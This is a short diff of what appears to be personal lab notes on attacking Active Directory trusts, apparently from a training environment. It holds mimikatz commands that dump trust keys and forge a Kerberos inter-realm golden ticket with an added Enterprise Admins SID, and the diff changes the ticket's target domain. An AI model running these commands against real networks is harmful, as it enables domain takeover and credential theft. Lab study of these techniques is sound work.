@@ -196,7 +196,7 @@ mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
 # 
 
 # i used the keys here
-.\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:ef3c6d05afaa2e14f307b03d6531e119 /target:ZSM.LOCAL /service:krbtgt  /ticket:trust.kirbi"
+.\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:ef3c6d05afaa2e14f307b03d6531e119 /target:INLANEFREIGHT.LOCAL /service:krbtgt  /ticket:trust.kirbi"
 
 klist
 
